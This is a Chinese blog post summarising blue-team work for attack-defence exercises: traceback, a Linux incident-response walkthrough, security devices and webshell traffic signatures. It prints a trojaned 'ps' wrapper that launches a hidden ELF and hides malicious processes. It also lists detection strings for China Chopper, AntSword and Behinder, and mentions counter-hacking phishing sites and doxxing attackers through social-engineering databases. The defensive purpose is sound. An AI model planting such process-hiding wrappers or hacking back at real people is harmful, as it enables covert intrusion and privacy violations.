<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>hw蓝队总结 | micgo's blog</title><meta name="keywords" content="红蓝对抗"><meta name="author" content="micgo"><meta name="copyright" content="micgo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="红蓝对抗蓝队组成根据演习中角色和分工，有如下情况：  目标系统运营单位：参演单位，负责蓝队整体的组织和指挥。 安全运营团队：负责整体防护工作和攻击监控工作。  攻防专家：负责对监控过程中发现的可疑攻击进行分析研判，指导安全运营团队、软件开发等一些 列相关部门对漏洞进行整改 安全厂商：负责对自身的安全产品的可用性、可靠性和防护监控策略是否合理，进行随时调整。 软件开发商：负责对自身系统安全加固、监控">
<meta property="og:type" content="article">
<meta property="og:title" content="hw蓝队总结">
<meta property="og:url" content="https://micgo.top/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/hvv/index.html">
<meta property="og:site_name" content="micgo&#39;s blog">
<meta property="og:description" content="红蓝对抗蓝队组成根据演习中角色和分工，有如下情况：  目标系统运营单位：参演单位，负责蓝队整体的组织和指挥。 安全运营团队：负责整体防护工作和攻击监控工作。  攻防专家：负责对监控过程中发现的可疑攻击进行分析研判，指导安全运营团队、软件开发等一些 列相关部门对漏洞进行整改 安全厂商：负责对自身的安全产品的可用性、可靠性和防护监控策略是否合理，进行随时调整。 软件开发商：负责对自身系统安全加固、监控">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg">
<meta property="article:published_time" content="2023-03-14T16:00:00.000Z">
<meta property="article:modified_time" content="2023-03-22T10:52:52.937Z">
<meta property="article:author" content="micgo">
<meta property="article:tag" content="红蓝对抗">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg"><link rel="shortcut icon" href="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg"><link rel="canonical" href="https://micgo.top/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/hvv/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'hw蓝队总结',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-03-22 18:52:52'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">micgo's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">hw蓝队总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-14T16:00:00.000Z" title="发表于 2023-03-15 00:00:00">2023-03-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-22T10:52:52.937Z" title="更新于 2023-03-22 18:52:52">2023-03-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="hw蓝队总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h4 id="红蓝对抗"><a href="#红蓝对抗" class="headerlink" title="红蓝对抗"></a>红蓝对抗</h4><h5 id="蓝队组成"><a href="#蓝队组成" class="headerlink" title="蓝队组成"></a>蓝队组成</h5><p>根据演习中角色和分工，有如下情况： </p>
<p>目标系统运营单位：参演单位，负责蓝队整体的组织和指挥。</p>
<p>安全运营团队：负责整体防护工作和攻击监控工作。 </p>
<p>攻防专家：负责对监控过程中发现的可疑攻击进行分析研判，指导安全运营团队、软件开发等一些 列相关部门对漏洞进行整改</p>
<p>安全厂商：负责对自身的安全产品的可用性、可靠性和防护监控策略是否合理，进行随时调整。 软件开发商：负责对自身系统安全加固、监控和配合攻防专家对发现的安全问题进行整改。 </p>
<p>网络运维团队：负责配合安全专家对网络建构安全、出口整体优化、网络监控、溯源等一些列工作。</p>
<p>云（如有）提供商，负责对自身云系统安全加固，以及对云上系统的安全进行监控同时协助攻防专 家对发现问题进行整改</p>
<h5 id="决战阶段"><a href="#决战阶段" class="headerlink" title="决战阶段"></a>决战阶段</h5><p>避免不必要减分情况，提前进行攻击拦截，主动获得各种加分项，及时控制风险。 </p>
<p>工作内容：通告处置，封堵封禁，预警监控，分析研判，应急响应，事件上报，策略优化，整改加固 </p>
<p>主要的4个团队：</p>
<p> 安全运营中心（监控和处置团队）：对每个安全警报分类、快速收集关键信息，并根据研判结果进行处 置 研判管理团队：向利益相关者提供证据、建议和意见，确定处理事件的节奏 安全专家团队：参与重要和高优先级事件</p>
<p> 威胁狩猎团队：确定事件的根本原因，还原攻击路径 研判是核心，要具备攻防能力，熟悉网络和业务，充分发挥指挥家的作用。向前端，对监控人员发现的 攻击预警进行分析确认；向后端，知道协助处置团队和狩猎团队对攻击进行处置和溯源。 </p>
<p>监控团队，尽量要做到全面覆盖，网络边界，内网办公区，应用系统，主机系统要全面布局安全检测手段，尽量多的使用不同监控方式，只要不影响业务，监测手段越多元化越好</p>
<p> 处置团队，提高单位时间内的处置效率，最短时间内采取最直接有效的技术手段进行遏制，防止攻击蔓 延。事件处置环节，应该联合网络，系统，应用等等多个岗位人员共同处置</p>
<p>总结：闭环安全风险 </p>
<h5 id="总结阶段"><a href="#总结阶段" class="headerlink" title="总结阶段"></a>总结阶段</h5><p>经验、教训</p>
<p>整改、完善</p>
<h4 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h4><p>在发现有入侵者后，快速由守转攻，进行精准地溯源反制，收集攻击路径和攻击者身份信息，勾勒出完整的攻击者画像</p>
<h5 id="IP-反查域名"><a href="#IP-反查域名" class="headerlink" title="IP 反查域名"></a>IP 反查域名</h5><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316184645453.png" alt="image-20230316184645453" style="zoom:67%;" />

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316184701935.png" alt="image-20230316184701935" style="zoom:67%;" />

<h5 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h5><p>社交平台 支付宝 微信 抖音 github  百度 谷歌 csdn 百度贴吧 社工库</p>
<p>ip定位技术 id追踪术——溯源案例: 利用 id 从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</p>
<p>网站 url：域名Whois 查询注册人姓名、地址、电话和邮箱——溯源案例：通过攻击 IP 历史解析记录&#x2F;域名，对域名注册信息进行溯源分析3.3.4 </p>
<h5 id="常见攻击源"><a href="#常见攻击源" class="headerlink" title="常见攻击源"></a>常见攻击源</h5><p>安全设备报警，如扫描 IP、威胁阻断、病毒木马、入侵事件等  </p>
<p>日志与流量分析，异常的通讯流量、攻击源与攻击目标等 </p>
<p>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等</p>
<p>邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等 </p>
<p>蜜罐系统，获取攻击者行为、意图的相关信息</p>
<h5 id="邮件钓鱼攻击溯源"><a href="#邮件钓鱼攻击溯源" class="headerlink" title="邮件钓鱼攻击溯源"></a>邮件钓鱼攻击溯源</h5><p>攻防场景：攻击者利用社会工程学技巧伪造正常邮件内容，绕过邮件网关的查杀，成功投递到目标邮箱，诱骗用户点击邮件链接或下载附件文件</p>
<p>信息收集： 通过查看邮件原文，获取发送方 IP 地址、域名后缀邮箱、钓鱼网站或恶意附件样本等信息</p>
<p>溯源方式：第一种，可以通过相关联的域名&#x2F;IP 进行追踪；第二种，对钓鱼网站进行反向渗透获取权限，进一步收集攻击者信息；第三种，通过对邮件恶意附件进行分析，利用威胁情报数据平台寻找同源样本获取信息，也能进一步对攻击者的画像进行勾勒</p>
<h5 id="Web-入侵溯源"><a href="#Web-入侵溯源" class="headerlink" title="Web 入侵溯源"></a>Web 入侵溯源</h5><p>攻防场景：攻击者通过 NDAY 和 0DAY 漏洞渗入服务器网段，Webshell 触发安全预警或者威胁检测阻断了 C&amp;C 域名的通讯</p>
<p>溯源方式：</p>
<p>隔离 webshell 样本，使用 Web 日志还原攻击路径，找到安全漏洞位置进行漏洞修复</p>
<p>从日志可以找到攻击者的 IP 地址，但攻击者一般都会使用代理服务器或匿名网络（例如 Tor）来掩盖其真实的 IP 地址</p>
<h5 id="恶意样本同源分析"><a href="#恶意样本同源分析" class="headerlink" title="恶意样本同源分析"></a>恶意样本同源分析</h5><p>提取样本特征、用户名、ID、邮箱、C2 服务器等信息</p>
<p>溯源案例：样本分析过程中，发现攻击者的个人 ID 和 QQ，成功定位到攻击者</p>
<h5 id="蜜罐溯源"><a href="#蜜罐溯源" class="headerlink" title="蜜罐溯源"></a>蜜罐溯源</h5><p>攻防场景：在企业内网部署蜜罐去模拟各种常见的应用服务，诱导攻击者攻击</p>
<p>溯源方式：在攻击者入侵蜜罐时，蜜罐可以记录攻击者的入侵行为，获取攻击者的主机信息、浏览器信息、甚至是真实 IP 及社交信息</p>
<h4 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h4><p><strong>准备 检测  抑制  根除  恢复  跟踪</strong></p>
<p>被攻击&#x2F;入侵的表现：</p>
<blockquote>
<p>网站类型：被篡改，信息丢失，乱码等<br>文件类型：被篡改，丢失，泄露等<br>系统类型：系统卡顿，CPU爆满，服务宕机等<br>流量类型：大量异常数据包，外部连接，网络网速卡顿等<br>第三方类型：服务异常，运行异常等</p>
</blockquote>
<p>事件信息收集：windows-linux-MAC</p>
<blockquote>
<p>对外服务情况<br>开放端口情况<br>系统版本<br>网络环境<br>漏洞情况<br>软件相关平台信息<br>口令整理收集<br>具备的防护情况</p>
</blockquote>
<p>事件攻击类型：</p>
<blockquote>
<p>WEB：漏洞攻击，综合类型攻击，流量攻击<br>第三方：数据库，远程软件，服务平台<br>操纵系统：权限提权，内网渗透，远程漏洞</p>
</blockquote>
<p>事件追查：   根据事件的表现选择最佳方法追查与排查</p>
<blockquote>
<p>1.日志分析<br>2.后门分析<br>3.流量分析<br>4.脚本软件分析<br>5.模拟渗透方法分析</p>
</blockquote>
<p>没有具体的信息需要全面摸查，通常以下总结的思路排查<br>1.web漏洞-检查源码类型以及漏洞情况<br>2.中间件漏洞-检查对应的版本 以及漏洞情况<br>3.第三方组件应用漏洞-检查使用存在最新的漏洞情况<br>4.操作系统层面导致漏洞-检查系统版本补丁漏洞情况<br>5.其他安全问题（弱口令，后门等），使用相关的shell，弱口令检查工具扫描</p>
<p><strong>攻防演练&#x2F;重保过程中，发生真实攻击，如何应急&#x2F;流程？</strong></p>
<p>0.（攻击确认）研判分析确定为真实攻击，攻击ip封禁</p>
<p>1.（范围确定）根据安全设备确定受影响资产&#x2F;主机设备</p>
<p>2.（事件类型）勒索&#x2F;挖矿&#x2F;蠕虫&#x2F;钓鱼&#x2F;webshell流量&#x2F;反弹shell&#x2F;外联&#x2F;敏感操作</p>
<p>3.（抑制扩散&#x2F;横向）甲方允许&#x2F;且对业务不造成重大影响的情况下对已沦陷设备，进行一个断网阻断&#x2F;或者是不出网的防火墙策略，或是web业务下线</p>
<p>4.（主机排查）根据事件类型上机排查，结束目标&#x2F;外联&#x2F;恶意进程，再对目标可能存在的权限维持手段进行排查清除</p>
<p>5.（影响范围）基于hids主机防御系统，查看失陷主机有没有进行一个内网横向渗透阶段，关注同网段主机设备是否存在被攻击&#x2F;失陷可能</p>
<p>6.（事件分析）基于 流量态势感知ids&#x2F;主机防御系统 hids（或是web日志，主机日志），找出红方攻击流程，漏洞利用点，漏洞分析&#x2F;钓鱼邮件分析&#x2F;恶意程序，攻击时间段，攻击ip，影响范围</p>
<p>7.（修复加固）出具修复&#x2F;加固方案</p>
<p>8.（输出报告）红方&#x2F;攻击流程&#x2F;利用阶段，蓝方应急响应&#x2F;阻断情况&#x2F;漏洞分析&#x2F;修复加固&#x2F;业务上线</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure>



<h5 id="排查网络连接"><a href="#排查网络连接" class="headerlink" title="**排查网络连接   **"></a>**排查网络连接   **</h5><p><strong>netstat -anpt</strong></p>
<p>发现服务器192.168.226.132 一直与恶意IP  192.168.226.131的6666端口连接，并且程序名为：shell.elf     PID为11393和15634</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316224819714.png" alt="image-20230316224819714" style="zoom:50%;" />

<p><strong>根据PID号查找程序位置   lsof -p 11393</strong></p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316224957529.png" alt="image-20230316224957529" style="zoom: 45%;" />

<p><strong>查看 shell.elf 文件的创建时间  stat shell.elf</strong></p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316225043112.png" alt="image-20230316225043112" style="zoom:67%;" />

<p>取shell.elf放到微步检测里去跑一跑</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316225135277.png" alt="image-20230316225135277" style="zoom:47%;" />



<h5 id="排查历史命令"><a href="#排查历史命令" class="headerlink" title="**排查历史命令   **"></a>**排查历史命令   **</h5><p><strong>history</strong></p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316225421455.png" alt="image-20230316225421455" style="zoom:50%;" />

<p>在 root账户下排查是否有黑客执行的命令      cd &#x2F;root        cat .bash_history </p>
<h5 id="排查后门账户"><a href="#排查后门账户" class="headerlink" title="排查后门账户"></a><strong>排查后门账户</strong></h5><p><code>查看当前登录系统的用户 who</code></p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316225458458.png" alt="image-20230316225458458" style="zoom:67%;" />

<p><code>查看特权账户    awk -F: &#39;$3==0 &#123;print$1&#125;&#39; /etc/passwd</code></p>
<p><code>查看可以远程登录的帐号信息    awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p>
<p><code>查看用户最近登录情况   grep &quot;Accepted &quot; /var/log/secure* | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></p>
<h5 id="排查定时任务"><a href="#排查定时任务" class="headerlink" title="排查定时任务"></a>排查定时任务</h5><p>查看服务器的定时任务  cd &#x2F;var&#x2F;spool&#x2F;cron     cat root</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316230032484.png" alt="image-20230316230032484" style="zoom:67%;" />

<p>发现存在root账户的定时任务，每分钟执行一次 &#x2F;root&#x2F;shell.elf文件</p>
<h5 id="排查是否有命令被替换"><a href="#排查是否有命令被替换" class="headerlink" title="排查是否有命令被替换"></a>排查是否有命令被替换</h5><p>检查命令文件是否被替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rpm -Vf /usr/bin/*</span><br><span class="line">rpm -Vf /usr/sbin/*</span><br><span class="line">#rpm -Vf /usr/bin/xxx</span><br><span class="line">#S 关键字代表文件大小发生了变化</span><br><span class="line">#5 关键字代表文件的 md5 值发生了变化</span><br><span class="line">#T 代表文件时间发生了变化</span><br></pre></td></tr></table></figure>

<p>执行命令  rpm -Vf &#x2F;usr&#x2F;bin&#x2F;*  时发现 ps 命令的文件大小、md5 值、时间发生了变化，可能已经被修改</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316231823242.png" alt="image-20230316231823242" style="zoom: 50%;" />

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316231827437.png" alt="image-20230316231827437" style="zoom: 52%;" />

<p> 查看ps命令内容     ls -al ps          cat ps</p>
<p>ps文件内容被修改成以下内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">/centos_core.elf &amp; /.hide_command/ps | grep -v <span class="string">&quot;shell&quot;</span> | grep -v <span class="string">&quot;centos_core&quot;</span> | grep <span class="string">&quot;bash&quot;</span></span><br><span class="line"><span class="comment">#每次执行ps命令都会执行centos_core.elf文件、.hide_command/ps文件</span></span><br><span class="line"><span class="comment">#grep -v的意思是只打印没有匹配的，而匹配的反而不打印，相当于隐藏shell、centos_core、bash异常文件信息</span></span><br></pre></td></tr></table></figure>



<h5 id="排查安全日志"><a href="#排查安全日志" class="headerlink" title="排查安全日志"></a>排查安全日志</h5><p>Linux:  &#x2F;var&#x2F;log下</p>
<blockquote>
<p>&#x2F;var&#x2F;log&#x2F;message   系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一<br>&#x2F;var&#x2F;log&#x2F;secure   与安全相关的日志信息<br>&#x2F;var&#x2F;log&#x2F;maillog   与邮件相关的日志信息<br>&#x2F;var&#x2F;log&#x2F;cron   与定时任务相关的日志信息<br>&#x2F;var&#x2F;log&#x2F;spooler   与UUCP和news设备相关的日志信息<br>&#x2F;var&#x2F;log&#x2F;boot.log   守护进程启动和停止相关的日志消息</p>
</blockquote>
<p>查看secure日志，发现爆破的时间范围是1.13 21：51：32——21：58：31</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316232659405.png" alt="image-20230316232659405"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat secure-20220421 | grep Failed</span><br></pre></td></tr></table></figure>

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230316232718695.png" alt="image-20230316232718695" style="zoom:45%;" />



<h5 id="清除后门文件"><a href="#清除后门文件" class="headerlink" title="清除后门文件"></a>清除后门文件</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /root/shell.elf</span><br><span class="line">rm -rf /centos_core.elf</span><br></pre></td></tr></table></figure>

<p>将ps命令删除再将 .hide_command&#x2F;ps 恢复</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /usr/bin/ps</span><br><span class="line">mv /.hide_command/ps  /usr/bin/ps</span><br></pre></td></tr></table></figure>

<p>删除后门账户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/passwd</span><br><span class="line">#按dd删除某行</span><br></pre></td></tr></table></figure>



<h5 id="工具查杀"><a href="#工具查杀" class="headerlink" title="工具查杀"></a>工具查杀</h5><p><code>webshell</code>查杀：  D盾   百度WEBDIR+  河马  <code>Sangfor WebShellKill </code>(深信服)</p>
<p> shell查杀：  360星图  ELK  Splunk   遇到不同环境，搜索中间件日志或者对应网站的日志位置</p>
<p><strong>总结：</strong>人工+工具分析，大的用工具，小的可以人工分析</p>
<h5 id="webshell检测"><a href="#webshell检测" class="headerlink" title="webshell检测"></a>webshell检测</h5><p>静态检测：匹配特征码，特征值，危险函数</p>
<p>动态检测：WAF、IDS等设备 </p>
<p>日志检测：通过IP访问规律，页面访问规律筛选，文件完整性监控</p>
<h4 id="安全设备"><a href="#安全设备" class="headerlink" title="安全设备"></a>安全设备</h4><p><strong>Waf</strong></p>
<p>Web应用防火墙是通过执行一系列针对HTTP或者HTTPS的安全策略来专门为Web应用提供保护的一款产品。WAF对请求的内容进行规则匹配、行为分析等识别出恶意行为，并执行相关动作，这些动作包括阻断、记录、告警等</p>
<p>宝塔  安全狗</p>
<p>ips 入侵防御系统（IPS一般也是在网络层旁路，可以理解为具备阻断能力的IDS，是IDS的升级版（也有IDS检测到攻击通知阻断设备执行阻断动作的设备联动模式），可以覆盖网络层和应用层）</p>
<p>ids 入侵检测系统（IDS工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击）（奇安信天眼）</p>
<p>hids 主机入侵检测系统（青藤云设备 奇安信椒图）</p>
<p>安恒的明御apt攻击预警平台</p>
<blockquote>
<ol>
<li>外部威胁监测</li>
<li>脆弱性监测</li>
<li>攻击取证溯源分析</li>
<li>感知安全威胁趋势规律</li>
<li>资产发现与管理</li>
</ol>
</blockquote>
<p>（apt攻击：高级长期威胁advanced persistent threat，又称高级持续性威胁、先进持续性威胁等，是指<strong>隐匿而持久的电脑入侵过程，通常由某些人员精心策划，针对特定的目标</strong>）</p>
<p>奇安信天擎终端安全管理系统、奇安信网神态势感知与安全运营平台NGSOC</p>
<p>堡垒机 jumpserver</p>
<blockquote>
<p>身份验证 Authentication</p>
<p>账号管理 Account</p>
<p>授权控制 Authorization</p>
<p>安全审计 Audit</p>
</blockquote>
<p>针对内部运维人员的运维安全审计系统。主要功能是对运维人员的运维操作进行审计和权限控制(比如要登录某些平台或者系统只能通过堡垒机才可以，不用堡垒机是无法访问的)。同时堡垒机还有账号集中管理、单点登录(在堡垒机上登录即可实现对多个其他平台的无密登录)等功能</p>
<p>蜜罐：   微步的Hfish</p>
<h4 id="防守策略"><a href="#防守策略" class="headerlink" title="防守策略"></a>防守策略</h4><p><strong>策略收紧常态化</strong></p>
<p>联系现有设备的厂商将现有的安全设备策略进行调整，将访问控制策略收紧，数据库、系统组件等进行加固</p>
<p><strong>减少攻击暴露面</strong></p>
<p>暴露在互联网上的资产，并于能在互联网中查到的现网信息进行清除</p>
<p><strong>各种口令复杂化</strong></p>
<p>不论是操作系统、业务入口，还是数据库、中间件，甚至于主机，凡是需要口令认证的都将口令复杂化设置</p>
<p><strong>核心业务白名单</strong></p>
<p>将核心业务系统及重要业务系统做好初始化的工作，记录业务正常产生的流量，实施白名单策略</p>
<p><strong>主机系统打补丁</strong></p>
<p>对业务系统做基线核查，将不符合标准的项进行整改，并对业务系统做漏洞检查，并对找出的脆弱想进行整改</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230317214638041.png" alt="image-20230317214638041" style="zoom:50%;" />



<h4 id="常用shell工具及流量特征"><a href="#常用shell工具及流量特征" class="headerlink" title="常用shell工具及流量特征"></a>常用shell工具及流量特征</h4><p><strong>菜刀</strong></p>
<p>菜刀<code> webshell</code> 只使用了 <code>url</code> 编码 + base64 编码<br>shell 特征就是存在<code>eval</code> <code>base64</code>等特征字符，传输参数名为 z0，存在一段以QG开头，7J结尾的固定base64代码。还存在<code>int_set(&quot;display_errors&quot;,&quot;0&quot;)</code>字符串特征</p>
<p><strong>蚁剑</strong></p>
<p>默认的蚁剑 shell，连接时会请求两次，其请求体只是经过 url 编码，其流量中也存在和菜刀一样的代码</p>
<p>数据中含有<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);</code>    header中含有<code>antsword</code>字眼</p>
<p>第一次请求，关闭报错和 magic_quotes，接下来去获取主机的信息<br>第二次请求，会把主机目录列出来</p>
<p><strong>冰蝎</strong></p>
<p>冰蝎2.0</p>
<p>使用 aes 加密发起三次请求<br>第一次请求服务端产生密钥写入 session，session 和当前会话绑定，不同的客户端的密钥也是不同的<br>第二次请求是为了获取 key，第三次使用 key 的 aes 加密进行通信</p>
<p>冰蝎3.0</p>
